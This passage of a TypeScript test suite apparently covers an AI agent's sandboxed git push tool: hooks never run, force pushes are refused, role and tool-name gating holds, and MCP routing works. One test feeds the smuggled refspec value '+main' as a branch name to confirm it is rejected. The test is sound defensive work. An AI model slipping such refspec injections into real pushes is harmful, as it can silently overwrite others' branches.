    git(repo, "branch", "other");
    git(repo, "tag", "v1");
    const p = await planned();
    const r = await run(p);
    expect(r).toMatchObject({ ok: true });
    expect(r.summary).toContain("a new branch there");
    expect(git(bare, "rev-parse", "refs/heads/feature/x")).toBe(p.sha);
    expect(() => git(bare, "rev-parse", "--verify", "-q", "refs/heads/other")).toThrow();
    expect(() => git(bare, "rev-parse", "--verify", "-q", "refs/tags/v1")).toThrow();
    const again = await run(await planned());
    expect(again).toMatchObject({ ok: true });
    expect(again.summary).toContain("already up to date");
  });

  test("the repository's hooks never run (pre-push), and a commit made after the plan isn't pushed", async () => {
    const marker = join(root, "hook-ran");
    const hook = join(repo, ".git", "hooks", "pre-push");
    writeFileSync(hook, `#!/bin/sh\ntouch ${marker}\n`);
    chmodSync(hook, 0o755);
    const p = await planned();
    writeFileSync(join(repo, "c.txt"), "c\n");
    git(repo, "add", ".");
    git(repo, "commit", "-q", "-m", "after the plan");
    const r = await run(p);
    expect(r.ok).toBe(true);
    expect(existsSync(marker)).toBe(false);
    expect(git(bare, "rev-parse", "refs/heads/feature/x")).toBe(p.sha);
  });

  test("a stop before or during the bundle ends it, saying the session is closing", async () => {
    const p = await planned();
    const stopped = new AbortController();
    stopped.abort();
    expect(await run(p, { signal: stopped.signal })).toMatchObject({ ok: false, summary: expect.stringContaining("closing") });
    const later = new AbortController();
    const slow = await run(p, {
      signal: later.signal,
      makeBundle: (_r, _ref, dest) => {
        const child = spawn("sleep", ["30"]);
        setTimeout(() => later.abort(), 50);
        return bundleFromChild(child, dest, { timeoutMs: 30_000, signal: later.signal });
      },
    });
    expect(slow).toMatchObject({ ok: false, summary: expect.stringContaining("the session is closing") });
  });

  test("a remote branch with commits ours doesn't have: refused by the remote, never forced, and the agent is told what to do", async () => {
    await run(await planned());
    // Someone else moves the remote branch.
    const other = join(root, "other");
    git(root, "clone", "-q", `file://${bare}`, other);
    git(other, "checkout", "-q", "feature/x");
    writeFileSync(join(other, "z.txt"), "z\n");
    git(other, "add", ".");
    git(other, "commit", "-q", "-m", "theirs");
    git(other, "push", "-q", "origin", "feature/x");
    const theirs = git(other, "rev-parse", "HEAD");
    git(repo, "commit", "-q", "--amend", "-m", "rewritten");
    const r = await run(await planned());
    expect(r.ok).toBe(false);
    expect(r.summary).toContain("a force push isn't done for agents");
    expect(git(bare, "rev-parse", "refs/heads/feature/x")).toBe(theirs);
  });
});

describe("push: how it is offered", () => {
  test("the gate knows it by every backend's name for it, and nothing else", () => {
    for (const name of ["mcp__codeoid_sandbox__push", "codeoid_sandbox__push"]) {
      expect(isPushTool(name)).toBe(true);
      // The session decides it (its checks, the owner's answer): it is never a "safe" read the gate waves through.
      expect(isSafeTool(name)).toBe(false);
    }
    for (const name of ["push", "mcp__other__push", "mcp__codeoid_sandbox__pushx", "x_mcp__codeoid_sandbox__push"]) expect(isPushTool(name)).toBe(false);
    // Round 9: a role without the network, or a read-only one, can't push (it writes a remote and runs its CI).
    for (const role of [{ write: false, network: true }, { write: true, network: false }, { write: true, network: "read-only" }] as const) {
      expect(roleDeniesTool({ ...role, envelope: "all" }, "mcp__codeoid_sandbox__push")).toContain("doesn't allow pushing");
    }
    expect(roleDeniesTool({ write: true, network: true, envelope: "all" }, "mcp__codeoid_sandbox__push")).toBeNull();
  });

  test("the daemon's /mcp/sandbox lists push beside request_directory and routes a call to the session's handler", async () => {
    const calls: unknown[] = [];
    const http = new SandboxMcpHttp(async () => "dir", async (sessionId, input) => {
      calls.push({ sessionId, input });
      return "Done: pushed";
    });
    const token = http.mint("s1");
    const rpc = async (body: unknown) =>
      (await (await http.handle(new Request("http://x/mcp/sandbox", { method: "POST", headers: { authorization: `Bearer ${token}`, "content-type": "application/json" }, body: JSON.stringify(body) }))).json()) as {
        result: { tools?: Array<{ name: string }>; content?: Array<{ text: string }> };
      };
    const list = await rpc({ jsonrpc: "2.0", id: 1, method: "tools/list" });
    expect(list.result.tools?.map((t) => t.name)).toEqual(["request_directory", "push"]);
    const called = await rpc({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "push", arguments: { branch: "feature/x" } } });
    expect(called.result.content?.[0]?.text).toBe("Done: pushed");
    expect(calls).toEqual([{ sessionId: "s1", input: { branch: "feature/x" } }]);
    const bad = await rpc({ jsonrpc: "2.0", id: 3, method: "tools/call", params: { name: "push", arguments: { branch: "+main" } } });
    expect(bad.result.content?.[0]?.text).toContain("isn't a branch name");
    expect(calls).toHaveLength(1);
    // Without a push handler (an older wiring), only request_directory is there.
    const plain = new SandboxMcpHttp(async () => "dir");
    const t2 = plain.mint("s2");
    const listed = (await (await plain.handle(new Request("http://x", { method: "POST", headers: { authorization: `Bearer ${t2}` }, body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "tools/list" }) }))).json()) as { result: { tools: Array<{ name: string }> } };
    expect(listed.result.tools.map((t) => t.name)).toEqual(["request_directory"]);
  });
});
